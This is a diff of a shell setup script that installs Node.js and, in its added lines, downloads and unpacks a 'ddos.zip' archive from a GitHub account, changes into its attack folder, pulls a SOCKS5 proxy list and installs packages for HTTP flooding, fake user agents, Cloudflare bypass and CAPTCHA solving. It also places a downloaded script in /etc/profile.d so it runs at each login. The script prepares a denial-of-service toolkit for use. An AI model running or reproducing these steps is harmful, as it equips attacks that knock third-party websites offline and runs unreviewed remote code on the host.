@@ -10,11 +10,12 @@ sudo tar -xf node-v18.17.0-linux-x64.tar.xz -C /opt
 wget https://raw.githubusercontent.com/sniper404ghostxploit/NODEJS/main/nodejs.sh
 sudo mv nodejs.sh /etc/profile.d/
 rm node-v18.17.0-linux-x64.tar.xz
+wget https://raw.githubusercontent.com/sniper404ghostxploit/NODEJS/main/ddos.zip
+unzip ddos.zip
+rm ddos.zip
 sudo apt-get install npm
+cd ddos/axs
 wget https://raw.githubusercontent.com/TheSpeedX/PROXY-List/master/socks5.txt
-wget https://raw.githubusercontent.com/sniper404ghostxploit/NODEJS/main/node_modules.zip
-unzip node_modules.zip
-rm node_modules.zip
 npm i randomstring axios fake-useragent
 npm i url fs http2 http net tls cluster header-generator ddos events net cloudscraper request cluster cloudflare-bypasser hcaptcha-solver
 pip3 install speedtest-cli
